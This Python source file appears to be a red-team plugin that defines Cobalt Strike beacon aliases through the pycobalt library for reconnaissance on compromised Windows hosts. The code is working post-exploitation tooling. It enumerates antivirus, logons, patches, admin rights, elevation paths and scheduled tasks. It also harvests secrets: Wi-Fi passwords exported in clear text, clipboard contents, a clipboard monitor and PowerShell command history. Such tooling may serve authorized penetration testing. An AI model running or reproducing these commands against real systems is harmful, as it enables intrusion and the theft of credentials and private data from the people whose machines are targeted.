#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
import pycobalt.sharpgen as sharpgen
from pycobalt.helpers import powershell_quote

import external

def import_host_recon(bid):
    """
    Import HostRecon.ps1
    """

    aggressor.bpowershell_import(bid, utils.basedir('powershell/HostRecon.ps1'))

@aliases.alias('basic-recon', 'Perform some basic host recon')
def _(bid):
    aggressor.bps(bid)

    import_host_recon(bid)
    aggressor.bpowerpick(bid, 'Invoke-BasicRecon')

# TODO improve output format
@aliases.alias('idletime', "Get user's idletime")
def _(bid):
    import_host_recon(bid)
    aggressor.bpowerpick(bid, 'Get-IdleTime')

# TODO get commandline and owner working
@aliases.alias('processinfo', 'Get additional process info')
def _(bid):
    import_host_recon(bid)
    aggressor.bpowerpick(bid, 'Get-Processes')

# TODO get working
# see powerview Get-DomainTrustMapping
@aliases.alias('logons', 'Get current and historical logon information')
def _(bid):
    import_host_recon(bid)

    aggressor.bnet(bid, 'logons')
    aggressor.bnet(bid, 'sessions')

    command = helpers.code_string(r"""
        Write-Output "---------- Explicit logons, past 10 days ----------"
        Get-ExplicitLogons 10

        Write-Output "`n---------- Logons, past 100 events ----------"
        Get-Logons 100
        """)

    aggressor.btask(bid, 'Tasked beacon to get historical logon information')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('av', 'Get registered AV info')
def _(bid):
    import_host_recon(bid)
    aggressor.bpowerpick(bid, 'Get-AV')

@aliases.alias('search-index', 'Search file index for a pattern')
def _(bid, pattern, out=None):
    import_host_recon(bid)
    command = 'Get-IndexedFiles {}'.format(powershell_quote(pattern))

    if out:
        # output to file
        command += ' > {}'.format(powershell_quote(out))

    aggressor.bpowerpick(bid, command)

# TODO put policy settings in another alias
@aliases.alias('interesting-keys', 'Get interesting registry keys')
def _(bid):
    import_host_recon(bid)
    aggressor.bpowerpick(bid, 'Get-InterestingKeys')

# TODO remove if seatbelt is working well
@aliases.alias('patches-old', 'Get list of patches on system')
def _(bid):
    command = helpers.code_string(r"""
        wmic os get Caption /value
        Get-WmiObject -class Win32_quickfixengineering |
            Select-Object HotFixID,Description,InstalledBy,InstalledOn |
            Sort-Object InstalledOn -Descending |
            Format-Table -Auto
        """)

    aggressor.btask(bid, 'Tasked beacon to get patch info')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('indomain', 'Check if user is in a domain')
def _(bid):
    command = helpers.code_string(r"""
        If ((gwmi win32_computersystem).partofdomain){
            Write-Output "User is in domain: $env:userdomain"
        } Else {
            Write-Output "User is not in a domain"
        }
        """)

    aggressor.btask(bid, "Tasked beacon to check if it's in a domain")
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('pipes', 'List named pipes on a host')
def _(bid, *hosts):
    if not hosts:
        hosts = ('.',)

    # read in pipe descriptions
    pipes = {}
    for line in open(utils.basedir('resources/pipes.txt')):
        pipe, description = line.split('\t')
        pipe = pipe.lower()
        pipes[pipe] = description

    code = helpers.code_string(r"""
        foreach (string host in args) {
            string path = $@"\\{host}\pipe";

            foreach (string pipe in System.IO.Directory.GetFiles(path)) {
                Console.WriteLine(pipe);
            }
        }
        """)

    aggressor.btask(bid, 'Tasked beacon to list pipes on {}'.format(', '.join(hosts)))
    sharpgen.execute(bid, code, hosts)

# TODO fix
@aliases.alias('isadmin', "Check if user is local admin")
def _(bid):
    command = helpers.code_string(r"""
        if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            echo "User is a local admin!";
        } else {
            echo "User is not local admin :(";
        }
        """)

    aggressor.btask(bid, 'Tasked beacon to check if user is a local admin')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('apps', 'Get list of installed applications')
def _(bid):
    aggressor.bshell(bid, 'wmic product get Name,Version,Description')

@aliases.alias('uninstallers', 'Get list of app uninstallers')
def _(bid):
    command = helpers.code_string(r"""
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Select-Object DisplayName, InstallDate |
        Sort-Object -Property DisplayName |
        Format-Table -AutoSize
        """)

    aggressor.bpowerpick(bid, command)

@aliases.alias('appdata', 'List folders in Local and Roaming AppData')
def _(bid):
    command = helpers.code_string("""
        ls $env:localappdata
        ls $env:appdata
        """)

    aggressor.bpowerpick(bid, command)

@aliases.alias('docs', 'List common document folders')
def _(bid):
    command = ''

    for d in ['Desktop', 'Documents', 'Downloads', 'Favorites']:
        command += 'ls $env:userprofile\\{}\n'.format(d)

    aggressor.bpowerpick(bid, command)

# TODO get profile export working
@aliases.alias('wifi', 'List WLAN profiles or get a profile')
def _(bid, profile=None):
    if profile:
        command = helpers.code_string("""
            netsh wlan export profile name="{name}" folder=$env:temp key=clear
            $profile = $env:temp:\*{name}*.xml 
            get-content $profile
            rm $profile
            """.format(name=profile))
        aggressor.bpowerpick(bid, command)
    else:
        aggressor.bshell(bid, 'netsh wlan show profiles name="*" key=clear');

@aliases.alias('clipboard', 'Get clipboard')
def _(bid):
    command = helpers.code_string(r"""
        Add-Type -AssemblyName System.Windows.Forms
        $tb = New-Object System.Windows.Forms.TextBox
        $tb.Multiline = $true
        $tb.Paste()
        if ($tb.Text.Length -ne 0) {
            $tb.Text
        } else {
            Write-Output "Clipboard does not contain text data"
        }
	""")

    aggressor.btask(bid, 'Tasked beacon to grab the clipboard')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('clipboard-monitor', 'Start clipboard monitor')
def _(bid, *args):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Start-ClipboardMonitor.ps1'))
    aggressor.bpowerpick(bid, 'Start-ClipboardMonitor {}'.format(' '.join(powershell_quote(args))))

@aliases.alias('powershell-history', 'Get Powershell console history')
def _(bid, last=50):
    command = helpers.code_string(r"""
        $hist = (Get-Content "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -EA 0 |
            Select -last {})
        if ($hist) {{
             $hist -Join "`r`n"
        }} else {{
            "No Powershell history found"
        }}
        """.format(last))

    aggressor.btask(bid, 'Tasked beacon to show {} items of powershell history'.format(last))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('startups', 'Show user startups')
def _(bid):
    aggressor.bpowerpick(bid, 'wmic startup list full')

@aliases.alias('schtasks', 'Get list of scheduled tasks')
def _(bid):
    command = helpers.code_string(r"""
        $schedule = New-Object -com("Schedule.Service")
	$schedule.connect()
	$tasks = $schedule.getfolder("\").gettasks(0) |
            Select-Object Name, Path, Enabled |
            Format-Table -Wrap |
            Out-String
	If ($tasks.count -eq 0) {
		Write-Output "No scheduled tasks"
	}
	If ($tasks.count -ne 0) {
		$tasks
	}
        """)
    
    aggressor.btask(bid, 'Tasked beacon to list scheduled tasks')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('seatbelt', 'Run Seatbelt')
def _(bid, *args):
    external.run(bid, 'seatbelt', args)

@aliases.alias('seatbelt-system', 'Run Seatbelt system')
def _(bid, *args):
    external.run(bid, 'seatbelt', ['system'] + list(args))

@aliases.alias('seatbelt-user', 'Run Seatbelt user')
def _(bid, *args):
    external.run(bid, 'seatbelt', ['user'] + list(args))

@aliases.alias('seatbelt-all', 'Run Seatbelt all')
def _(bid, *args):
    external.run(bid, 'seatbelt', ['all'] + list(args))

@aliases.alias('seatbelt-full', 'Run Seatbelt all full')
def _(bid, *args):
    external.run(bid, 'seatbelt', ['all', 'full'] + list(args))

@aliases.alias('mapped', 'Show mapped drives')
def _(bid):
    external.run(bid, 'seatbelt', 'MappedDrives')

@aliases.alias('basic', 'Show basic host info')
def _(bid):
    external.run(bid, 'seatbelt', ['BasicOSInfo', 'UserFolders', 'AntiVirusWMI', 'InterestingProcesses'])

@aliases.alias('elevation', 'Show elevation potential')
def _(bid):
    external.run(bid, 'seatbelt', ['BasicOSInfo', 'UACSystemPolicies', 'Patches', 'TokenGroupPrivs', 'LocalGroupMembers'])

@aliases.alias('patches', 'Get list of patches on system')
def _(bid):
    external.run(bid, 'seatbelt', 'Patches')
